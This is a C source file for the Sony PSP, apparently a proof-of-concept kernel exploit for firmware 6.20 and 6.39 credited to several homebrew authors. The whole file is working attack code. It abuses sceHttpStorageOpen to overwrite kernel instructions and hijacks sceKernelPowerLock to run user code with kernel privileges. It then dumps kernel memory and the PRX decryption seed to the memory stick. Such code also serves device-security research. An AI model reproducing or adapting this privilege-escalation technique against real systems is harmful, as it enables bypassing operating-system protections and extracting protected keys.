#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

PSP_MODULE_INFO("6.xxKxploit", PSP_MODULE_USER, 1, 0);

/**
 * PSP_THREAD_ATTR_VFPU is mandatory by this exploit
 * Because the instruction (vsync 0xffff) needs VFPU context
 */
PSP_MAIN_THREAD_ATTR(PSP_THREAD_ATTR_USER | PSP_THREAD_ATTR_VFPU);

PSP_HEAP_SIZE_KB(0);

#define printk pspDebugScreenPrintf

/**
 * Taken from M33 SDK.
 * Describes a Module Structure from the chained Module List.
 */
typedef struct SceModule2
{
	struct SceModule2 * next; // 0
	unsigned short attribute; // 4
	unsigned char version[2]; // 6
	char modname[27]; // 8
	char terminal; // 0x23
	char mod_state;  // 0x24
	char unk1;    // 0x25
	char unk2[2]; // 0x26
	unsigned int unk3; // 0x28
	SceUID modid; // 0x2C
	unsigned int unk4; // 0x30
	SceUID mem_id; // 0x34
	unsigned int mpid_text;  // 0x38
	unsigned int mpid_data; // 0x3C
	void * ent_top; // 0x40
	unsigned int ent_size; // 0x44
	void * stub_top; // 0x48
	unsigned int stub_size; // 0x4C
	unsigned int entry_addr_; // 0x50
	unsigned int unk5[4]; // 0x54
	unsigned int entry_addr; // 0x64
	unsigned int gp_value; // 0x68
	unsigned int text_addr; // 0x6C
	unsigned int text_size; // 0x70
	unsigned int data_size;  // 0x74
	unsigned int bss_size; // 0x78
	unsigned int nsegment; // 0x7C
	unsigned int segmentaddr[4]; // 0x80
	unsigned int segmentsize[4]; // 0x90
} SceModule2;

u32 version = 0;

extern int sceHttpStorageOpen(int a0, int a1, int a2);
extern int sceKernelPowerLock(unsigned int, unsigned int);

void sync_cache(void)
{
	/*
	 * Beware there is a bug in PSPSDK. 
	 * sceKernelIcacheInvalidateAll in pspsdk is imported as UtilsForKernel by default which cannot be used for an user PRX (returns 0x8002013A)
	 * Because of this the original kxploit by some1 used a delay by 1 second to flush i-cache. But sometimes it still fails.
	 * import.S contains sceKernelIcacheInvalidateAll as workaround
	 */
	sceKernelIcacheInvalidateAll();
	sceKernelDcacheWritebackInvalidateAll();
}

/** Recovery the instruction we smashed */
void recovery_sysmem(void) {
	switch (version) {
	case 0x620:
		_sw(0x3C058801, 0x8800CCBC);	// lui $a1, 0x8801 for 6.20
		break;
	case 0x639:
		_sw(0x3C058801, 0x8800CC34);	// lui $a1, 0x8801 for 6.39
		break;
	default:
		break;
	}
}

int is_exploited = 0;

int kernel_permission_call(void) {
	void (*_sceKernelIcacheInvalidateAll)(void) = (void *)0x88000E98;
	void (*_sceKernelDcacheWritebackInvalidateAll)(void) = (void *)0x88000744;

	recovery_sysmem();

	_sceKernelIcacheInvalidateAll();
	_sceKernelDcacheWritebackInvalidateAll();

	/* copy kmem to user */
	memcpy((void*)0x08A00000, (void*)0x88000000, 0x400000);
	memcpy((void*)(0x08A00000 + 0x400000), (void*)0xBFC00200, 0x100);

	is_exploited = 1;

	return 0;
}

void do_exploit(void) {
	u32 kernel_entry, entry_addr;
	u32 interrupts;
	u32 i;
	int ret;

	/* Load network libraries */
	for (i = 1; i <= 6; ++i) {
		ret = sceUtilityLoadModule(i + 0xFF);
		printk("sceUtilityLoadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
	}

	/**
	 * Write vsync 0xFFFF(0xFFFFFFFF) to @sceHttpStorage_Service@+0x00000060
	 * You can consider vsync 0xFFFF as NOP
	 * This call enables sceHttpStorageOpen to write any addresses
	 * which contains value which is greater than 0 and has alignment of 4, with vsync 0xFFFF(0xFFFFFFFF)
	 */
	ret = sceHttpStorageOpen(-612, 0, 0);
	printk("sceHttpStorageOpen#1 -> 0x%08X\n", ret);
	sync_cache();

	/* No delay need here because we flushed icache properly */

	/**
	 * Write vsync 0xFFFF(0xFFFFFFFF) to the first instruction of sceKernelPowerLockForUser
	 * Now the gate to kernel is opened :)
	 */
	switch (version) {
	case 0x620:
		ret = sceHttpStorageOpen((0x8800CCBC >> 2), 0, 0); // scePowerLock override for 6.20
		break;
	case 0x639:
		ret = sceHttpStorageOpen((0x8800CC34 >> 2), 0, 0); // scePowerLock override for 6.39
		break;
	default:
		break;
	}
	printk("sceHttpStorageOpen#2 -> 0x%08X\n", ret);
	sync_cache();

	/* Call kernel_permission_call by hacked sceKernelPowerLock */
	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	switch (version) {
	case 0x620:
		/* 0x00004234 is sceKernelPowerLockForUser data offset for 6.20 */
		sceKernelPowerLock(0, ((u32) &entry_addr) - 0x00004234);
		break;
	case 0x639:
		/* 0x000040F4 is sceKernelPowerLockForUser data offset for 6.39 */
		sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
		break;
	default:
		break;
	}
	pspSdkEnableInterrupts(interrupts);

	/* Unload network libraries */
	for (i = 6; i >= 1; --i) {
		ret = sceUtilityUnloadModule(i + 0xFF);
		printk("sceUtilityUnloadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
	}
}

/** Dump the kernel memory and the prx decrypt key */
void dump_kmem()
{
	SceUID fd;

	fd = sceIoOpen("ms0:/kmem.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);

	if (fd >= 0) {
		sceIoWrite(fd, (void*)0x08A00000, 0x400000);
		sceIoClose(fd);
	}

	fd = sceIoOpen("ms0:/seed.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);

	if (fd >= 0) {
		sceIoWrite(fd, (void*)(0x08A00000+0x400000), 0x100);
		sceIoClose(fd);
	}
}

int main(int argc, char * argv[])
{
	pspDebugScreenInit();

	u32 devkit = sceKernelDevkitVersion();
	version = (((devkit >> 24) & 0xF) << 8) | (((devkit >> 16) & 0xF) << 4) | ((devkit >> 8) & 0xF);

	printk("6.xx kxploit improve POC by SmikY\n");
	printk("6.39 kxploit POC by liquidzigong\n");
	printk("originally found (c) by some1\n");
	printk("You PSP Kernel Version: 0x%X\n", version);
	printk("Kernel memory will be dumped into ms0:/KMEM.BIN and ms0:/SEED.BIN\n\n");
	printk("Press O start dump memory or X to exit.\n");

	while (1) {
		SceCtrlData pad;
		sceCtrlReadBufferPositive(&pad, 1);
		if (pad.Buttons & PSP_CTRL_CROSS)
			break;
		else if (pad.Buttons & PSP_CTRL_CIRCLE) {
			do_exploit();

			if (is_exploited) {
				printk("Exploited! Dumping kmem....\n");
				dump_kmem();
			} else
				printk("Exploit failed...\n");
		}
		sceKernelDelayThread(10000);
	}

	printk("Exiting...\n");

	sceKernelDelayThread(1000000);
	sceKernelExitGame();
	sceKernelExitDeleteThread(0);

	return 0;
}
